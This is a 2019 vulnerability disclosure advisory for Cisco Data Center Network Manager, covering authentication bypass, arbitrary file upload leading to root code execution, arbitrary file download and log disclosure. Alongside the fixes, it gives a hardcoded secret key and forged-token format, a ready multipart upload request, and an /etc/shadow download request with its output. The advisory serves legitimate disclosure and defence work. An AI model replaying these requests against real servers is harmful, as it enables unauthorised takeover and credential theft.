@@ -1,0 +1,615 @@
+>> Authentication Bypass and Arbitrary File Upload (leading to remote code execution) on Cisco Data Center Network Manager
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security (http://www.agileinfosec.co.uk/)
+==========================================================================
+Disclosure: 26/6/2019 / Last updated: 6/7/2019
+
+
+>> Executive summary:
+Cisco Data Center Network Manager (DCNM) is provided by Cisco as a virtual appliance as well as installation packages for Windows and Red Hat Linux. 
+DCNM is widely deloyed in data centres worldwide to manage Cisco devices on a global scale.
+
+DCNM 11.1(1) and below is affected by four vulnerabilities: authentication bypass, arbitrary file upload (leading to remote code execution), arbitrary file download and information disclosure via log download.
+
+The table below lists the affected versions for each vulnerability:
+
+Vulnerability                                           Vulnerable?                              CVE
+                            <= 10.4(2)          11.0(1)         11.1(1)       >= 11.2(1) 
+Authentication bypass           Yes               No              No              No           2019-1619
+File upload                 Yes, auth          Yes, auth      Yes, unauth         No           2019-1620
+File download               Yes, auth          Yes, auth      Yes, unauth         No           2019-1621
+Info disclosure             Yes, unauth        Yes, unauth    Yes, unauth         ?            2019-1622
+
+The authentication bypass affects versions 10.4(2), allowing an attacker to exploit the file upload for remote code execution.
+In version 11.0(1), authentication was introduced, and a valid unprivileged account is necessary to exploit all vulnerabilities except information discloure.
+Amazingly, in version 11.1(1) Cisco removed the authentication for the file upload and file download vulnerabilities.
+All vulnerabilities were fixed in 11.2(1), except the information disclosure, for which the status is unknown.
+
+To achieve remote code execution with arbitrary file upload vulnerability, an attacker can write a WAR file in the Tomcat webapps folder. The Apache Tomcat server is running as root, meaning that the Java shell will run as root.
+
+Agile Information Security would like to thank the iDefense Vulnerability Contributor Program for handling the disclosure process with Cisco [1].
+
+
+>> Vendor description [2]:
+"Cisco® Data Center Network Manager (DCNM) is the comprehensive management solution for all NX-OS network deployments spanning LAN fabrics, SAN fabrics, and IP Fabric for Media (IPFM) networking in the data center powered by Cisco. DCNM 11 provides management, control, automation, monitoring, visualization, and troubleshooting across Cisco Nexus® and Cisco Multilayer Distributed Switching (MDS) solutions.
+DCNM 11 supports multitenant, multifabric infrastructure management for Cisco Nexus Switches. DCNM also supports storage management with the Cisco MDS 9000 family and Cisco Nexus switch storage functions.
+
+DCNM 11 provides interfaces for reoccurring management tasks such as fabric bootstrap, compliance SAN zoning, device-alias management, slow-drain analysis, SAN host-path redundancy, and port-monitoring configuration."
+
+
+>> Technical details:
+#1
+Vulnerability: Authentication Bypass
+CVE-2019-1619
+Attack Vector: Remote
+Constraints: None
+Affected products / versions:
+- Cisco Data Center Network Manager 10.4(2) and below
+
+DCNM exposes a "ReportServlet" on the URL /fm/pmreport. By abusing this servlet, an unauthenticated attacker can obtain a valid administrative session on the web interface [3].
+
+The snippet of code below shows what the servlet does:
+com.cisco.dcbu.web.client.performance.ReportServlet
+
+	public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+		Credentials cred = (Credentials)request.getSession().getAttribute("credentials");
+		if((cred == null || !cred.isAuthenticated()) && !"fetch".equals(request.getParameter("command")) && !this.verifyToken(request)) {
+			request.setAttribute("popUpSessionTO", "true");
+		}
+
+		this.doInteractiveChart(request, response);
+	}
+  
+The request is passed on to the verifyToken function, listed below:
+  private boolean verifyToken(HttpServletRequest httpServletRequest) {
+		String token = httpServletRequest.getParameter("token");
+		if(token == null) {
+			return false;
+		} else {
+			try {
+				FMServerRif serverRif = SQLLoader.getServerManager();
+				IscRif isc = serverRif.getIsc(StringEncrypter.encryptString("DESede", (new Date()).toString()));
+				token = URLDecoder.decode(token, "UTF-8");
+				token = token.replace(' ', '+');
+				FMUserBase fmUserBase = isc.verifySSoToken(token);
+				if(fmUserBase == null) {
+					return false;
+				} else {
+					Credentials newCred = new Credentials();
+					int idx = fmUserBase.getUsername().indexOf(64);
+					newCred.setUserName(idx == -1?fmUserBase.getUsername():fmUserBase.getUsername().substring(0, idx));
+					newCred.setPassword(StringEncrypter.DESedeDecrypt(fmUserBase.getEncryptedPassword()));
+					newCred.setRole(fmUserBase.getRole());
+					newCred.setAuthenticated(true);
+					httpServletRequest.getSession().setAttribute("credentials", newCred);
+					return true;
+				}
+			} catch (Exception var8) {
+				var8.printStackTrace();
+				return false;
+			}
+		}
+	}
+  
+As it can be seen in the line:
+				FMUserBase fmUserBase = isc.verifySSoToken(token);
+the HTTP request parameter "token" gets passed to IscRif.verifySsoToken, and if that function returns a valid user, the request is authenticated and credentials are stored in the session.
+
+Let's dig deeper and find out what happens in IscRif.verifySsoToken. The class implementing is actually com.cisco.dcbu.sm.server.facade.IscImpl:
+
+	public FMUserBase verifySSoToken(String ssoToken) {
+		return SecurityManager.verifySSoToken(ssoToken);
+	}
+  
+Digging further into SecurityManager.verifySSoToken:
+com.cisco.dcbu.sm.server.security.SecurityManager
+
+public static FMUserBase verifySSoToken(String ssoToken) {
+		String userName = null;
+		FMUserBase fmUserBase = null;
+		FMUser fmUser = null;
+
+		try {
+			userName = getSSoTokenUserName(ssoToken);
+			if(confirmSSOToken(ssoToken)) {
+				fmUser = UserManager.getInstance().findUser(userName);
+				if(fmUser != null) {
+					fmUserBase = new FMUserBase(userName, fmUser.getHashedPwd(), fmUser.getRoles());
+				}
+
+				if(fmUserBase == null) {
+					fmUserBase = DCNMUserImpl.getFMUserBase(userName);
+				}
+
+				if(fmUserBase == null) {
+					fmUserBase = FMSessionManager.getInstance().getFMUser(getSessionIdByToken(ssoToken));
+				}
+			}
+		} catch (Exception var5) {
+			_Logger.info("verifySSoToken: ", var5);
+		}
+
+		return fmUserBase;
+	}
+
+As it can be seen in the code above, the username is obtained from the token here:
+			userName = getSSoTokenUserName(ssoToken);
+
+Digging yet another layer we find the following:
+public static String getSSoTokenUserName(String ssoToken) {
+		return getSSoTokenDetails(ssoToken)[3];
+	}
+
+	private static String[] getSSoTokenDetails(String ssoToken) {
+		String[] ret = new String[4];
+		String separator = getTokenSeparator();
+		StringTokenizer st = new StringTokenizer(ssoToken, separator);
+		if(st.hasMoreTokens()) {
+			ret[0] = st.nextToken();
+			ret[1] = st.nextToken();
+			ret[2] = st.nextToken();
+
+			for(ret[3] = st.nextToken(); st.hasMoreTokens(); ret[3] = ret[3] + separator + st.nextToken()) {
+				;
+			}
+		}
+
+		return ret;
+	}
+  
+Seems like the token is a string which is separated by the "separator" with four components, the fourth of which is the username.
+
+Now going back to SecurityManager.verifySSoToken listed above, we see that after the call to getSSoTokenUserName, confirmSSOToken is called:
+        public static FMUserBase verifySSoToken(String ssoToken) {
+                (...)
+			userName = getSSoTokenUserName(ssoToken);
+			if(confirmSSOToken(ssoToken)) {
+				fmUser = UserManager.getInstance().findUser(userName);
+				if(fmUser != null) {
+					fmUserBase = new FMUserBase(userName, fmUser.getHashedPwd(), fmUser.getRoles());
+				}
+                (...)
+        }
+                
+	public static boolean confirmSSOToken(String ssoToken) {
+		String userName = null;
+		int sessionId = false;
+		long sysTime = 0L;
+		String digest = null;
+		int count = false;
+		boolean ret = false;
+
+		try {
+			String[] detail = getSSoTokenDetails(ssoToken);
+			userName = detail[3];
+			int sessionId = Integer.parseInt(detail[0]);
+			sysTime = (new Long(detail[1])).longValue();
+			if(System.currentTimeMillis() - sysTime > 600000L) {
+				return ret;
+			}
+
+			digest = detail[2];
+			if(digest != null && digest.equals(getMessageDigest("MD5", userName, sessionId, sysTime))) {
+				ret = true;
+				userNameTLC.set(userName);
+			}
+		} catch (Exception var9) {
+			_Logger.info("confirmSSoToken: ", var9);
+		}
+
+		return ret;
+	}
+  
+Now we can further understand the token. It seems it is composed of:
+sessionId + separator + sysTime + separator + digest + separator + username
+	
+And what is the digest? Let's look into the getMessageDigest function:
+  
+	
+		private static String getMessageDigest(String algorithm, String userName, int sessionid, long sysTime) throws Exception {
+			String input = userName + sessionid + sysTime + SECRETKEY;
+			MessageDigest md = MessageDigest.getInstance(algorithm);
+			md.update(input.getBytes());
+			return new String(Base64.encodeBase64((byte[])md.digest()));
+		}
+    
+It is nothing more than the MD5 of:
+userName + sessionid + sysTime + SECRETKEY
+
+... and SECRETKEY is a fixed key in the code:
+	private static final String SECRETKEY = "POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF";
+  
+... while the separator is a ".":
+	  private static String getTokenSeparator()
+	  {
+      return System.getProperty("security.tokenSeparator", ".");
+	  }
+    
+In summary, this is what happens:
+The ReportServlet will happily authenticate any request, as long as it receives a token in the following format:
+sessionId.sysTime.MD5(userName + sessionid + sysTime + SECRETKEY).username
+
+The sessionId can be made up by the user, sysTime can be obtained by getting the server Date HTTP header and then converting to milliseconds, and we know the SECRETKEY and the username, so now we can authenticate as any user. Here's an example token:
+GET /fm/pmreport?token=1337.1535935659000.upjVgZQmxNNgaXo5Ga6jvQ==.admin
+
+This request will return a 500 error due to the lack of some parameters necessary for the servlet to execute correctly, however it will also successfully authenticate us to the server, which will cause it to return a JSESSIONID cookie with valid authenticated session for the admin user.
+Note that the user has to be valid. The "admin" user is a safe bet as it is present by default in all systems, and it is also the most privileged user in the system.
+
+Unfortunately, this technique does not work for 11.0(1). I believe this is not because the vulnerability was fixed, as the exact same code is present in the newer version.
+In 11.0(1), the ReportServlet.verifyToken function crashes with an exception in the line noted below:
+
+  private boolean verifyToken(HttpServletRequest httpServletRequest) {
+        (...)
+					Credentials newCred = new Credentials();
+					int idx = fmUserBase.getUsername().indexOf(64);
+					newCred.setUserName(idx == -1?fmUserBase.getUsername():fmUserBase.getUsername().substring(0, idx));
+					newCred.setPassword(StringEncrypter.DESedeDecrypt(fmUserBase.getEncryptedPassword()));                    <--- exception occurs here
+					newCred.setRole(fmUserBase.getRole());
+					newCred.setAuthenticated(true);
+					httpServletRequest.getSession().setAttribute("credentials", newCred);
+					return true;
+				}
+			} catch (Exception var8) {
+				var8.printStackTrace();
+				return false;
+			}
+        (...)
+  }
+      
+The exception returned is a "com.cisco.dcbu.lib.util.StringEncrypter$EncryptionException: javax.crypto.BadPaddingException: Given final block not properly padded".
+This will cause execution to go into the catch block shown above, and the function will return false, so the JSESSIONID cookie returned by the server will not have the credentials stored in it.
+
+I believe this is purely a coding mistake - Cisco updated their password encryption method, but failed to update their own code. Unless this ReportServlet code is deprecated, this is a real bug that happens to fix a security vulnerability by accident.
+
+On version 11.0(1), it seems that the ReportServlet has been removed from the corresponding WAR xml mapping file, so requesting that URL now returns an HTTP 404 error.
+
+
+#2
+Vulnerability: Arbitrary File Upload (leading to remote code execution)
+CVE-2019-1620
+Attack Vector: Remote
+Constraints: Authentication to the web interface as an unprivileged user required EXCEPT for version 11.1(1), where it can be exploited by an unauthenticated user
+Affected products / versions:
+- Cisco Data Center Network Manager 11.1(1) and below
+
+DCNM exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload. An authenticated user can abuse this servlet to upload files to an arbitrary directory and ultimately achieve remote code execution [4].
+
+The code for this servlet is listed below:
+com.cisco.dcbu.web.client.reports.FileUploadServlet
+
+	public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+		this.doGet(request, response);
+	}
+
+	public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+		Credentials cred = (Credentials)((Object)request.getSession().getAttribute("credentials"));
+		if (cred == null || !cred.isAuthenticated()) {
+			throw new ServletException("User not logged in or Session timed out.");
+		}
+		this.handleUpload(request, response);
+	}
+  
+The code shown above is simple, and the request is passed onto handleUpload:
+
+	private void handleUpload(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+		response.setContentType(CONTENT_TYPE);
+		PrintWriter out = null;
+		ArrayList<String> allowedFormats = new ArrayList<String>();
+		allowedFormats.add("jpeg");
+		allowedFormats.add("png");
+		allowedFormats.add("gif");
+		allowedFormats.add("jpg");
+		allowedFormats.add("cert");
+		File disk = null;
+		FileItem item = null;
+		DiskFileItemFactory factory = new DiskFileItemFactory();
+		String statusMessage = "";
+		String fname = "";
+		String uploadDir = "";
+		ListIterator iterator = null;
+		List items = null;
+		ServletFileUpload upload = new ServletFileUpload((FileItemFactory)factory);
+		TransformerHandler hd = null;
+		try {
+			out = response.getWriter();
+			StreamResult streamResult = new StreamResult(out);
+			SAXTransformerFactory tf = (SAXTransformerFactory)SAXTransformerFactory.newInstance();
+			items = upload.parseRequest(request);
+			iterator = items.listIterator();
+			hd = tf.newTransformerHandler();
+			Transformer serializer = hd.getTransformer();
+			serializer.setOutputProperty("encoding", "UTF-8");
+			serializer.setOutputProperty("doctype-system", "response.dtd");
+			serializer.setOutputProperty("indent", "yes");
+			serializer.setOutputProperty("method", "xml");
+			hd.setResult(streamResult);
+			hd.startDocument();
+			AttributesImpl atts = new AttributesImpl();
+			hd.startElement("", "", "response", atts);
+			while (iterator.hasNext()) {
+				atts.clear();
+				item = (FileItem)iterator.next();
+				if (item.isFormField()) {
+					if (item.getFieldName().equalsIgnoreCase("fname")) {
+						fname = item.getString();
+					}
+					if (item.getFieldName().equalsIgnoreCase("uploadDir") && (uploadDir = item.getString()).equals(DEFAULT_TRUST_STORE_UPLOADDIR)) {
+						uploadDir = ClientCache.getJBossHome() + File.separator + "server" + File.separator + "fm" + File.separator + "conf";
+					}
+					atts.addAttribute("", "", "id", "CDATA", item.getFieldName());
+					hd.startElement("", "", "field", atts);
+					hd.characters(item.getString().toCharArray(), 0, item.getString().length());
+					hd.endElement("", "", "field");
+					atts.clear();
+					continue;
+				}
+				ImageInputStream imageInputStream = ImageIO.createImageInputStream(item.getInputStream());
+				Iterator<ImageReader> imageReaders = ImageIO.getImageReaders(imageInputStream);
+				ImageReader imageReader = null;
+				if (imageReaders.hasNext()) {
+					imageReader = imageReaders.next();
+				}
+				try {
+					String imageFormat = imageReader.getFormatName();
+					String newFileName = fname + "." + imageFormat;
+					if (allowedFormats.contains(imageFormat.toLowerCase())) {
+						FileFilter fileFilter = new FileFilter();
+						fileFilter.setImageTypes(allowedFormats);
+						File[] fileList = new File(uploadDir).listFiles(fileFilter);
+						for (int i = 0; i < fileList.length; ++i) {
+							new File(fileList[i].getAbsolutePath()).delete();
+						}
+						disk = new File(uploadDir + File.separator + fname);
+						item.write(disk);
+						Calendar calendar = Calendar.getInstance();
+						SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MM.dd.yy hh:mm:ss aaa");
+						statusMessage = "File successfully written to server at " + simpleDateFormat.format(calendar.getTime());
+					}
+					imageReader.dispose();
+					imageInputStream.close();
+					atts.addAttribute("", "", "id", "CDATA", newFileName);
+				}
+				catch (Exception ex) {
+					this.processUploadedFile(item, uploadDir, fname);
+					Calendar calendar = Calendar.getInstance();
+					SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MM.dd.yy hh:mm:ss aaa");
+					statusMessage = "File successfully written to server at " + simpleDateFormat.format(calendar.getTime());
+					atts.addAttribute("", "", "id", "CDATA", fname);
+				}
+				hd.startElement("", "", "file", atts);
+				hd.characters(statusMessage.toCharArray(), 0, statusMessage.length());
+				hd.endElement("", "", "file");
+			}
+			hd.endElement("", "", "response");
+			hd.endDocument();
+			out.close();
+		}
+		catch (Exception e) {
+			out.println(e.getMessage());
+		}
+	}
+  
+handleUpload is more complex, but here's a summary; the function takes an HTTP form with a parameter "uploadDir", a parameter "fname" and then takes the last form object and writes it into "uploadDir/fname". 
+However, there is a catch... the file has to be a valid image with one of the extensions listed here:
+		allowedFormats.add("jpeg");
+		allowedFormats.add("png");
+		allowedFormats.add("gif");
+		allowedFormats.add("jpg");
+		allowedFormats.add("cert");
+    
+However, if you look closely, it is possible to upload any arbitrary content. This is because nothing bad happens until we reach the second (inner) try-catch block. Once inside, the first thing that happens is this:
+				try {
+					String imageFormat = imageReader.getFormatName();
+
+... which will cause imageReader to throw and exception if the binary content we sent is not a file, sending us into the catch block:
+				catch (Exception ex) {
+					this.processUploadedFile(item, uploadDir, fname);
+					Calendar calendar = Calendar.getInstance();
+					SimpleDateFormat simpleDateFormat = new SimpleDateFormat("MM.dd.yy hh:mm:ss aaa");
+					statusMessage = "File successfully written to server at " + simpleDateFormat.format(calendar.getTime());
+					atts.addAttribute("", "", "id", "CDATA", fname);
+          
+... meaning that the file contents, upload dir and its name are sent into processUploadedFile. 
+
+Let's look into that now:
+	private void processUploadedFile(FileItem item, String uploadDir, String fname) throws Exception {
+		try {
+			int offset;
+			int contentLength = (int)item.getSize();
+			InputStream raw = item.getInputStream();
+			BufferedInputStream in = new BufferedInputStream(raw);
+			byte[] data = new byte[contentLength];
+			int bytesRead = 0;
+			for (offset = 0; offset < contentLength && (bytesRead = in.read(data, offset, data.length - offset)) != -1; offset += bytesRead) {
+			}
+			in.close();
+			if (offset != contentLength) {
+				throw new IOException("Only read " + offset + " bytes; Expected " + contentLength + " bytes");
+			}
+			FileOutputStream out = new FileOutputStream(uploadDir + File.separator + fname);
+			out.write(data);
+			out.flush();
+			out.close();
+		}
+		catch (Exception ex) {
+			throw new Exception("FileUploadSevlet processUploadFile failed: " + ex.getMessage());
+		}
+	}
+  
+Amazingly, this function totally ignores the content, and simple writes the file contents to the filename and folder we have indicated.
+In summary, if we send any binary content that is not a file, we can write it to any new file in any directory as root.
+  
+If we send the following request:
+POST /fm/fileUpload HTTP/1.1
+Host: 10.75.1.40
+Cookie: JSESSIONID=PcW4XFtcG6fkMUg7FpkZYJ5C;
+Content-Length: 429
+Content-Type: multipart/form-data; boundary=---------------------------9313517619947
+
+-----------------------------9313517619947
+Content-Disposition: form-data; name="fname"
+
+owned
+-----------------------------9313517619947
+Content-Disposition: form-data; name="uploadDir"
+
+/tmp/
+-----------------------------9313517619947
+Content-Disposition: form-data; name="filePath"; filename="whatever"
+Content-Type: application/octet-stream
+
+<any text or binary content here>
+
+-----------------------------9313517619947--
+
+The server will respond with:
+HTTP/1.1 200 OK
+X-FRAME-OPTIONS: SAMEORIGIN
+Content-Type: text/xml;charset=utf-8
+Date: Mon, 03 Sep 2018 00:57:11 GMT
+Connection: close
+Server: server
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE response SYSTEM "response.dtd">
+<response>
+<field id="fname">owned</field>
+<field id="uploadDir">/tmp/</field>
+<file id="whatever">File successfully written to server at 09.02.18 05:57:11 PM</file>
+</response>
+
+And our file has been written as root on the server:
+[root@dcnm_vm ~]# ls -l /tmp/
+(...)
+-rw-r--r--  1 root          root               16 Sep  2 17:57 owned
+(...)
+
+Finally if we write a WAR file to the JBoss deployment directory, and the server will deploy the WAR file as root, allowing the attacker to achieve remote code execution. 
+
+A Metasploit module that exploits this vulnerability has been released with this advisory.
+
+
+#3
+Vulnerability: Arbitrary File Download
+CVE-2019-1621
+Attack Vector: Remote
+Constraints: Authentication to the web interface as an unprivileged user required EXCEPT for version 11.1(1), where it can be exploited by an unauthenticated user
+Affected products / versions:
+- Cisco Data Center Network Manager 11.1(1) and below
+
+DCNM exposes a servlet to download files on /fm/downloadServlet. An authenticated user can abuse this servlet to download arbitrary files as root [5].
+
+The code below shows the servlet request processing code:
+com.cisco.dcbu.web.client.util.DownloadServlet 
+
+	public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+		Credentials cred = (Credentials)((Object)request.getSession().getAttribute("credentials"));
+		if (cred == null || !cred.isAuthenticated()) {
+			throw new ServletException("User not logged in or Session timed out.");
+		}
+		String showFile = (String)request.getAttribute("showFile");
+		if (showFile == null) {
+			showFile = request.getParameter("showFile");
+		}
+		File f = new File(showFile);
+		if (showFile.endsWith(".cert")) {
+			response.setContentType("application/octet-stream");
+			response.setHeader("Pragma", "cache");
+			response.setHeader("Cache-Control", "cache");
+			response.setHeader("Content-Disposition", "attachment; filename=fmserver.cert;");
+		} else if (showFile.endsWith(".msi")) {
+			response.setContentType("application/x-msi");
+			response.setHeader("Pragma", "cache");
+			response.setHeader("Cache-Control", "cache");
+			response.setHeader("Content-Disposition", "attachment; filename=" + f.getName() + ";");
+		} else if (showFile.endsWith(".xls")) {
+			response.setContentType("application/vnd.ms-excel");
+			response.setHeader("Pragma", "cache");
+			response.setHeader("Cache-Control", "cache");
+			response.setHeader("Content-Disposition", "attachment; filename=" + f.getName() + ";");
+		}
+		ServletOutputStream os = response.getOutputStream();
+		FileInputStream is = new FileInputStream(f);
+		byte[] buffer = new byte[4096];
+		int read = 0;
+		try {
+			while ((read = is.read(buffer)) > 0) {
+				os.write(buffer, 0, read);
+			}
+			os.flush();
+		}
+		catch (Exception e) {
+			LogService.log(LogService._WARNING, e.getMessage());
+		}
+		finally {
+			is.close();
+		}
+	}
+}
+
+As you can see, it's quite simple. It takes a "showFile" request parameter, reads that file and returns to the user. Here's an example of the servlet in action:
+
+Request:
+GET /fm/downloadServlet?showFile=/etc/shadow HTTP/1.1
+Host: 10.75.1.40
+Cookie: JSESSIONID=PcW4XFtcG6fkMUg7FpkZYJ5C;
+
+Response:
+HTTP/1.1 200 OK
+
+root:$1$(REDACTED).:17763:0:99999:7:::
+bin:*:15980:0:99999:7:::
+daemon:*:15980:0:99999:7:::
+adm:*:15980:0:99999:7:::
+lp:*:15980:0:99999:7:::
+(...)
+
+An interesting file to download is /usr/local/cisco/dcm/fm/conf/server.properties, which contains the database credentials as well as the sftp root password, both encrypted with a key that is hardcoded in the source code.
+
+A Metasploit module that exploits this vulnerability has been released with this advisory.
+
+
+#4
+Vulnerability: Information Disclosure (log files download)
+CVE-2019-1622
+Attack Vector: Remote
+Constraints: None
+Affected products / versions:
+- Cisco Data Center Network Manager 11.1(1) and below
+
+DCNM exposes a LogZipperServlet in /fm/log/fmlogs.zip. This servlet can be accessed by an unauthenticated attacker, and it will return all the log files in /usr/local/cisco/dcm/fm/logs/* in ZIP format, which provide information about local directories, software versions, authentication errors, detailed stack traces, etc [6].
+
+To access it, simply request:
+GET /fm/log/fmlogs.zip
+
+Code is not shown here for brevity, but the implementation class is com.cisco.dcbu.web.client.admin.LogZipperServlet.
+
+
+>> Fix: 
+For #1, upgrade to DCNM 11.0(1) and above [3].
+For #2 and #3, upgrade to DCNM 11.2(1) and above [4] [5].
+For #4, it is not clear from Cisco's advisory on which version it was fixed [6].
+
+
+>> References:
+[1] https://www.accenture.com/us-en/service-idefense-security-intelligence
+[2] https://www.cisco.com/c/en/us/products/collateral/cloud-systems-management/prime-data-center-network-manager/datasheet-c78-740978.html
+[3] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass
+[4] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-codex
+[5] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-file-dwnld
+[6] https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-infodiscl
+
+
+>> Disclaimer:
+Please note that Agile Information Security relies on the information provided by the vendor when listing fixed versions or products. Agile Information Security does not verify this information, except when specifically mentioned in this advisory or when requested or contracted by the vendor to do so. 
+Unconfirmed vendor fixes might be ineffective or incomplete, and it is the vendor's responsibility to ensure the vulnerablities found by Agile Information Security are resolved properly.
+Agile Information Security Limited does not accept any responsiblity, financial or otherwise, from any material losses, loss of life or reputational loss as a result of misuse of the information or code contained or mentioned in this advisory.
+It is the vendor's responsibility to ensure their products' security before, during and after release to market.
+
+All information, code and binary data in this advisory is released to the public under the GNU General Public License, version 3 (GPLv3).
+For information, code or binary data obtained from other sources that has a license which is incompatible with GPLv3, the original license prevails. 
+For more information check https://www.gnu.org/licenses/gpl-3.0.en.html
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business.
